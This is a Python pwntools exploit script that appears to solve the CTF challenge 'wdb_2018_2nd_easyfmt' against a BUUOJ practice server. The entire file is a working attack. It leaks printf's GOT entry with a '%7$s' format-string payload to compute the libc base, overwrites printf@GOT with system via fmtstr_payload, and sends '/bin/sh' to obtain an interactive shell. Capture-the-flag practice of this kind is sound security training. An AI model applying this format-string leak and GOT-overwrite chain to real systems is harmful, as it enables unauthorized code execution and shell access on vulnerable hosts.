import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='wdb_2018_2nd_easyfmt'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/i386-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',29943)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('../../i386libc/x86_libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		pay='%7$s'+p32(elf.got['printf'])
		io.recv()
		io.sendline(pay)

		libc_base=u32(io.recvuntil('\xf7')[-4:])-libc.sym['printf']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()

		pay=fmtstr_payload(6,{elf.got['printf']:system_addr},write_size='byte')
		io.recv()
		io.sendline(pay)
		io.recv()
		io.sendline('/bin/sh\x00')



		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue